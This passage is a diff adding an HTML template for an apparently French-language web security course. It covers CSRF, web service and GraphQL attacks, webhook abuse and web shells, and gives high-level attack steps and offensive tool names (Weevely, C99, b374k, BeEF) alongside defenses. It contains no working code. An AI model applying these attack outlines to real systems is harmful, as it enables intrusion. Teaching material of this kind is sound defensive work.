+                            <li><strong>XSStrike</strong>: Détection avancée XSS</li>
+                            <li><strong>CSRF PoC Generator</strong>: Génération de preuves concept</li>
+                            <li><strong>Browser Exploitation Framework</strong>: Exploits navigateur</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-warning text-dark">
+                        <h4>Attaque CSRF</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Identifier une action sensible (ex: transfert d'argent)</li>
+                            <li>Créer un formulaire malveillant reproduisant la requête</li>
+                            <li>Inciter la victime à visiter la page</li>
+                            <li>L'action est exécutée avec les droits de la victime</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="web-services" class="mt-5">
+        <h1>15. Attaque des services web</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Types de services web</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>SOAP</strong>: Protocole XML basé sur WSDL</li>
+                        <li><strong>REST</strong>: Architecture basée sur HTTP</li>
+                        <li><strong>GraphQL</strong>: Langage de requête moderne</li>
+                        <li><strong>gRPC</strong>: Appels de procédure à distance</li>
+                    </ul>
+                </div>
+                
+                <h3 class="mt-4">Vulnérabilités communes</h3>
+                <ul>
+                    <li>Authentification/authorization défectueuse</li>
+                    <li>Manque de validation des entrées</li>
+                    <li>Exposition de données excessive</li>
+                    <li>Déni de service</li>
+                    <li>Configurations incorrectes</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils de test API</h4>
+                        <ul>
+                            <li><strong>Postman</strong>: Test manuel et automation</li>
+                            <li><strong>OWASP ZAP</strong>: Scanner API</li>
+                            <li><strong>Burp Suite</strong>: Proxy et scanner API</li>
+                            <li><strong>SoapUI</strong>: Test de services SOAP</li>
+                            <li><strong>GraphQL Voyager</strong>: Inspection GraphQL</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Attaque GraphQL</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Découverte des schémas via introspection</li>
+                            <li>Analyse des requêtes et mutations</li>
+                            <li>Essai de requêtes profondes (DoS)</li>
+                            <li>Injection dans les arguments</li>
+                            <li>Contournement d'autorisation</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="api-webhooks" class="mt-5">
+        <h1>16. Web API, Webhooks et Web Shell</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Concepts modernes</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li><strong>Web API</strong>: Interface de programmation pour applications</li>
+                        <li><strong>Webhooks</strong>: Notifications événementielles</li>
+                        <li><strong>Web Shell</strong>: Script malveillant pour accès distant</li>
+                        <li><strong>Serverless Functions</strong>: Exécution de code sans serveur dédié</li>
+                    </ul>
+                </div>
+                
+                <div class="card bg-warning text-dark mt-3">
+                    <div class="card-header">
+                        <h4>Attaque de webhooks</h4>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Intercepter une requête de webhook</li>
+                            <li>Modifier la payload ou l'URL de callback</li>
+                            <li>Forger des événements malveillants</li>
+                            <li>Exploiter les SSRF via les webhooks</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-danger text-white">
+                    <div class="card-body">
+                        <h4>Web Shells</h4>
+                        <ul>
+                            <li>Types: PHP, ASP, JSP, Python</li>
+                            <li>Méthodes d'installation: Upload, injection, backdoor</li>
+                            <li>Fonctionnalités: Exécution de commandes, navigation fichiers</li>
+                            <li>Outils: Weevely, C99, b374k</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-success text-white">
+                        <h4>Détection et prévention</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>Analyur de signatures de fichiers</li>
+                            <li>Surveillance du comportement</li>
+                            <li>Restriction des fonctions dangereuses</li>
+                            <li>Validation des uploads de fichiers</li>
+                            <li>Scanning régulier du système de fichiers</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section id="web-security" class="mt-5">
+        <h1>17. Sécurité des applications web</h1>
+        
+        <div class="row">
+            <div class="col-md-6">
+                <h3>Bonnes pratiques de développement</h3>
+                <div class="card bg-light p-3">
+                    <ul>
+                        <li>Validation stricte des entrées</li>
+                        <li>Encodage des sorties</li>
+                        <li>Authentification forte (MFA)</li>
+                        <li>Gestion sécurisée des sessions</li>
+                        <li>Contrôle d'accès basé sur les rôles</li>
+                        <li>Journalisation et monitoring</li>
+                    </ul>
+                </div>
+                
+                <h3 class="mt-4">Sécurité dans le cycle de vie</h3>
+                <ul>
+                    <li>Revue de code sécurisée</li>
+                    <li>Tests automatisés de sécurité (SAST, DAST)</li>
+                    <li>Analyse des dépendances (SCA)</li>
+                    <li>Tests d'intrusion réguliers</li>
+                    <li>Formation des développeurs</li>
+                </ul>
+            </div>
+            
+            <div class="col-md-6">
+                <div class="card bg-info text-white">
+                    <div class="card-body">
+                        <h4>Outils de défense</h4>
+                        <ul>
+                            <li><strong>WAF</strong>: ModSecurity, Cloudflare</li>
+                            <li><strong>RASP</strong>: Protection runtime</li>
+                            <li><strong>SAST</strong>: SonarQube, Checkmarx</li>
+                            <li><strong>DAST</strong>: OWASP ZAP, Burp Suite Pro</li>
+                            <li><strong>SCA</strong>: Snyk, Dependency-Check</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="card mt-3">
+                    <div class="card-header bg-primary text-white">
+                        <h4>Cadres de sécurité</h4>
+                    </div>
+                    <div class="card-body">
+                        <ul>
+                            <li>OWASP Application Security Verification Standard</li>
+                            <li>NIST Cybersecurity Framework</li>
+                            <li>ISO/IEC 27034</li>
+                            <li>PCI DSS pour les applications de paiement</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card bg-success text-white mt-4">
+            <div class="card-body">
+                <h4>Programme de sécurité complet</h4>
+                <ol>
+                    <li>Évaluation des risques</li>
+                    <li>Définition des politiques</li>
+                    <li>Formation des équipes</li>
+                    <li>Implémentation des contrôles</li>
+                    <li>Surveillance continue</li>
+                    <li>Amélioration itérative</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+</div>
+
+{% endblock %}
